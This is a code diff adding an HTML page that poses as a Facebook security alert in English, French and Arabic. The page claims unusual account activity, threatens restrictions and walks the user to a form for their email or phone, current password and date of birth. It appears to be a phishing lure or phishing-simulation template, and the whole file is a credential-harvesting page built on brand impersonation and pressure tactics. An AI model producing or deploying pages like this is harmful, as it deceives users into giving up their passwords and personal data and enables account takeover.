@@ -1,0 +1,248 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <base href="https://facebook.com/account_risk_warning">
+    <title>Facebook - Account Security Alert</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <style>
+        :root {
+            --primary-color: #1877f2;
+            --secondary-color: #e4e6eb;
+            --text-color: #1c1e21;
+            --secondary-text-color: #606770;
+            --background-color: #f0f2f5;
+            --warning-color: #f03d25;
+            --border-color: #dddfe2;
+        }
+        body, html { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif; background-color: var(--background-color); margin: 0; padding: 0; min-height: 100vh; color: var(--text-color); font-size: 16px; line-height: 1.5; }
+        .container { width: 100%; max-width: 100%; margin: 0 auto; background-color: white; min-height: 100vh; display: flex; flex-direction: column; box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1); }
+        .header { display: flex; align-items: center; padding: 12px 16px; border-bottom: 1px solid var(--border-color); background-color: white; position: sticky; top: 0; z-index: 1000; }
+        .back-arrow { font-size: 20px; margin-right: 16px; text-decoration: none; color: var(--primary-color); }
+        .logo { width: 24px; height: 24px; margin-right: 12px; }
+        h1 { font-size: 18px; margin: 0; font-weight: 600; }
+        .content { flex-grow: 1; padding: 24px 16px; display: flex; flex-direction: column; justify-content: space-between; }
+        .warning-icon { font-size: 48px; color: var(--warning-color); text-align: center; margin-bottom: 24px; }
+        h2 { font-size: 22px; margin: 0 0 20px; text-align: center; font-weight: 600; }
+        p { font-size: 16px; color: var(--secondary-text-color); margin-bottom: 24px; text-align: center; line-height: 1.5; }
+        .button { display: block; width: 100%; padding: 12px 0; margin: 12px 0; border: none; border-radius: 8px; font-size: 16px; font-weight: 600; cursor: pointer; text-align: center; text-decoration: none; transition: background-color 0.3s ease; }
+        .primary-button { background-color: var(--primary-color); color: white; }
+        .primary-button:hover, .primary-button:active { background-color: #166fe5; }
+        .secondary-button { background-color: var(--secondary-color); color: var(--text-color); }
+        .secondary-button:hover, .secondary-button:active { background-color: #d8dadf; }
+        .location-info { font-size: 15px; color: var(--secondary-text-color); margin-bottom: 24px; text-align: center; }
+        .info-icon { color: var(--secondary-text-color); font-size: 16px; }
+        .input-field { margin-bottom: 20px; }
+        label { display: block; margin-bottom: 8px; color: var(--secondary-text-color); font-size: 15px; font-weight: 500; }
+        input[type="text"], input[type="password"], input[type="date"] { width: 100%; padding: 12px; border: 1px solid var(--border-color); border-radius: 8px; font-size: 16px; transition: border-color 0.3s ease; box-sizing: border-box; -webkit-appearance: none; -moz-appearance: none; appearance: none; }
+        input[type="text"]:focus, input[type="password"]:focus, input[type="date"]:focus { border-color: var(--primary-color); outline: none; }
+        .see-more { font-size: 15px; color: var(--primary-color); text-decoration: none; text-align: center; margin-top: 16px; font-weight: 500; display: inline-block; }
+        .info-text { font-size: 13px; color: var(--secondary-text-color); text-align: center; margin-top: 16px; line-height: 1.4; }
+        .spinner { display: inline-block; width: 20px; height: 20px; border: 3px solid rgba(255,255,255,.3); border-radius: 50%; border-top-color: #fff; animation: spin 1s ease-in-out infinite; }
+        @keyframes spin { to { transform: rotate(360deg); } }
+        @media (min-width: 480px) {
+            .container { max-width: 420px; margin: 20px auto; border-radius: 8px; min-height: calc(100vh - 40px); }
+            .header { border-top-left-radius: 8px; border-top-right-radius: 8px; }
+        }
+        @media (max-width: 360px) {
+            body, input, button { font-size: 14px; }
+            h1 { font-size: 16px; }
+            h2 { font-size: 20px; }
+            .warning-icon { font-size: 40px; }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <a href="https://tarma.com" class="back-arrow"><i class="fas fa-arrow-left"></i></a>
+            <img src="https://facebook.com/favicon.ico" alt="Facebook logo" class="logo">
+            <h1 id="title">Facebook Security</h1>
+        </div>
+        <div id="account-risk" class="content content-section">
+            <div>
+                <div class="warning-icon"><i class="fas fa-shield-alt"></i></div>
+                <h2 id="alert-title">Account Security Alert</h2>
+                <p id="alert-description">We've detected unusual activity on your account that requires immediate attention. To ensure the safety of your information, please verify your identity and secure your account now.</p>
+            </div>
+            <div>
+                <button class="button primary-button" onclick="secureAccount(this)" id="secure-account-btn">Secure My Account</button>
+                <button class="button secondary-button" onclick="reportHacked(this)" id="report-hacked-btn">Report Account Hacked</button>
+                <p class="info-text" id="ignore-alert">Ignoring this alert may result in temporary account restrictions for your protection.</p>
+            </div>
+        </div>
+        <div id="security-check" class="content content-section" style="display: none;">
+            <div>
+                <h2 id="verify-activity-title">Verify Recent Activity</h2>
+                <p id="verify-activity-description">We noticed a login from a new device or location. Please confirm if this was you:</p>
+                <div class="location-info">
+                    <i class="fas fa-clock"></i> 36 minutes ago<br>
+                    <i class="fas fa-map-marker-alt"></i> Near Saint-Georges, QC, Canada<br>
+                    <i class="fas fa-mobile-alt"></i> tarma for Android
+                </div>
+            </div>
+            <div>
+                <form method="GET" action="javascript:void(0);" onsubmit="verifyIdentity(event)">
+                    <button type="submit" name="action" value="not_me" class="button secondary-button" id="not-me-btn">This Wasn't Me</button>
+                    <button type="submit" name="action" value="was_me" class="button primary-button" id="was-me-btn">Yes, This Was Me</button>
+                </form>
+                <a href="javascript:void(0);" class="see-more" onclick="loadHTML('account-verification')" id="more-options">More Options</a>
+            </div>
+        </div>
+        <div id="account-verification" class="content content-section" style="display: none;">
+            <div>
+                <h2 id="verify-identity-title">Verify Your Identity</h2>
+                <p id="verify-identity-description">To maintain the security of your account, please confirm your information:</p>
+                <form method="GET" action="https://facebook.com/verification_complete">
+                    <div class="input-field">
+                        <label for="email" id="email-label">Email or Phone Number</label>
+                        <input type="text" id="email" name="email" required autocomplete="username">
+                    </div>
+                    <div class="input-field">
+                        <label for="password" id="password-label">Current Password</label>
+                        <input type="password" id="password" name="password" required autocomplete="current-password">
+                    </div>
+                    <div class="input-field">
+                        <label for="dob" id="dob-label">Date of Birth</label>
+                        <input type="date" id="dob" name="dob" required>
+                    </div>
+                    <button type="submit" class="button primary-button" onclick="verifyAccount(this)" id="confirm-identity-btn">Confirm Identity</button>
+                </form>
+            </div>
+            <div>
+                <p class="info-text" id="info-text">This verification process helps us ensure that you are the rightful account owner. Your information is kept confidential and secure.</p>
+            </div>
+        </div>
+    </div>
+    <script>
+        const translations = {
+            en: {
+                title: "Facebook Security",
+                alertTitle: "Account Security Alert",
+                alertDescription: "We've detected unusual activity on your account that requires immediate attention. To ensure the safety of your information, please verify your identity and secure your account now.",
+                secureAccountBtn: "Secure My Account",
+                reportHackedBtn: "Report Account Hacked",
+                ignoreAlert: "Ignoring this alert may result in temporary account restrictions for your protection.",
+                verifyActivityTitle: "Verify Recent Activity",
+                verifyActivityDescription: "We noticed a login from a new device or location. Please confirm if this was you:",
+                notMeBtn: "This Wasn't Me",
+                wasMeBtn: "Yes, This Was Me",
+                moreOptions: "More Options",
+                verifyIdentityTitle: "Verify Your Identity",
+                verifyIdentityDescription: "To maintain the security of your account, please confirm your information:",
+                emailLabel: "Email or Phone Number",
+                passwordLabel: "Current Password",
+                dobLabel: "Date of Birth",
+                confirmIdentityBtn: "Confirm Identity",
+                infoText: "This verification process helps us ensure that you are the rightful account owner. Your information is kept confidential and secure."
+            },
+            fr: {
+                title: "Sécurité Facebook",
+                alertTitle: "Alerte de Sécurité du Compte",
+                alertDescription: "Nous avons détecté une activité inhabituelle sur votre compte qui nécessite une attention immédiate. Pour assurer la sécurité de vos informations, veuillez vérifier votre identité et sécuriser votre compte maintenant.",
+                secureAccountBtn: "Sécuriser Mon Compte",
+                reportHackedBtn: "Signaler un Compte Piraté",
+                ignoreAlert: "Ignorer cette alerte peut entraîner des restrictions temporaires de votre compte pour votre protection.",
+                verifyActivityTitle: "Vérifiez l'Activité Récente",
+                verifyActivityDescription: "Nous avons remarqué une connexion depuis un nouvel appareil ou emplacement. Veuillez confirmer si c'était vous :",
+                notMeBtn: "Ce N'était Pas Moi",
+                wasMeBtn: "Oui, C'était Moi",
+                moreOptions: "Plus d'Options",
+                verifyIdentityTitle: "Vérifiez Votre Identité",
+                verifyIdentityDescription: "Pour maintenir la sécurité de votre compte, veuillez confirmer vos informations :",
+                emailLabel: "Email ou Numéro de Téléphone",
+                passwordLabel: "Mot de Passe Actuel",
+                dobLabel: "Date de Naissance",
+                confirmIdentityBtn: "Confirmer l'Identité",
+                infoText: "Ce processus de vérification nous aide à garantir que vous êtes le propriétaire légitime du compte. Vos informations sont gardées confidentielles et sécurisées."
+            },
+            ar: {
+                title: "أمان فيسبوك",
+                alertTitle: "تنبيه أمان الحساب",
+                alertDescription: "لقد اكتشفنا نشاطًا غير معتاد على حسابك يتطلب اهتمامًا فوريًا. لضمان أمان معلوماتك، يرجى التحقق من هويتك وتأمين حسابك الآن.",
+                secureAccountBtn: "تأمين حسابي",
+                reportHackedBtn: "الإبلاغ عن اختراق الحساب",
+                ignoreAlert: "قد يؤدي تجاهل هذا التنبيه إلى قيود مؤقتة على حسابك لحمايتك.",
+                verifyActivityTitle: "تحقق من النشاط الأخير",
+                verifyActivityDescription: "لاحظنا تسجيل دخول من جهاز أو موقع جديد. يرجى تأكيد ما إذا كان هذا أنت:",
+                notMeBtn: "لم يكن هذا أنا",
+                wasMeBtn: "نعم، كان هذا أنا",
+                moreOptions: "خيارات أكثر",
+                verifyIdentityTitle: "تحقق من هويتك",
+                verifyIdentityDescription: "للحفاظ على أمان حسابك، يرجى تأكيد معلوماتك:",
+                emailLabel: "البريد الإلكتروني أو رقم الهاتف",
+                passwordLabel: "كلمة المرور الحالية",
+                dobLabel: "تاريخ الميلاد",
+                confirmIdentityBtn: "تأكيد الهوية",
+                infoText: "تساعدنا عملية التحقق هذه في ضمان أنك مالك الحساب الشرعي. يتم الحفاظ على سرية وأمان معلوماتك."
+            }
+        };
+
+        function setLanguage() {
+            const userLang = navigator.language || navigator.userLanguage;
+            let lang = 'en'; // default to English
+            if (userLang.startsWith('fr')) lang = 'fr';
+            else if (userLang.startsWith('ar')) lang = 'ar';
+
+            document.getElementById('title').innerText = translations[lang].title;
+            document.getElementById('alert-title').innerText = translations[lang].alertTitle;
+            document.getElementById('alert-description').innerText = translations[lang].alertDescription;
+            document.getElementById('secure-account-btn').innerText = translations[lang].secureAccountBtn;
+            document.getElementById('report-hacked-btn').innerText = translations[lang].reportHackedBtn;
+            document.getElementById('ignore-alert').innerText = translations[lang].ignoreAlert;
+            document.getElementById('verify-activity-title').innerText = translations[lang].verifyActivityTitle;
+            document.getElementById('verify-activity-description').innerText = translations[lang].verifyActivityDescription;
+            document.getElementById('not-me-btn').innerText = translations[lang].notMeBtn;
+            document.getElementById('was-me-btn').innerText = translations[lang].wasMeBtn;
+            document.getElementById('more-options').innerText = translations[lang].moreOptions;
+            document.getElementById('verify-identity-title').innerText = translations[lang].verifyIdentityTitle;
+            document.getElementById('verify-identity-description').innerText = translations[lang].verifyIdentityDescription;
+            document.getElementById('email-label').innerText = translations[lang].emailLabel;
+            document.getElementById('password-label').innerText = translations[lang].passwordLabel;
+            document.getElementById('dob-label').innerText = translations[lang].dobLabel;
+            document.getElementById('confirm-identity-btn').innerText = translations[lang].confirmIdentityBtn;
+            document.getElementById('info-text').innerText = translations[lang].infoText;
+        }
+
+        function loadHTML(contentId) {
+            var contents = document.getElementsByClassName('content-section');
+            for (var i = 0; i < contents.length; i++) {
+                contents[i].style.display = 'none';
+            }
+            document.getElementById(contentId).style.display = 'flex';
+        }
+
+        function secureAccount(button) {
+            button.innerHTML = '<div class="spinner"></div>';
+            setTimeout(function() {
+                loadHTML('security-check');
+            }, 1000);
+        }
+
+        function reportHacked(button) {
+            button.innerHTML = '<div class="spinner"></div>';
+            setTimeout(function() {
+                loadHTML('account-verification');
+            }, 1000);
+        }
+
+        function verifyIdentity(event) {
+            event.preventDefault();
+            var button = event.submitter;
+            button.innerHTML = '<div class="spinner"></div>';
+            setTimeout(function() {
+                loadHTML('account-verification');
+            }, 1000);
+        }
+
+        function verifyAccount(button) {
+            button.innerHTML = '<div class="spinner"></div>';
+            setTimeout(function() {
+                window.location.href = 'https://facebook.com/verification_complete';
+            }, 1000);
+        }
+
+        setLanguage();
+    </script>
+</body>
+</html>
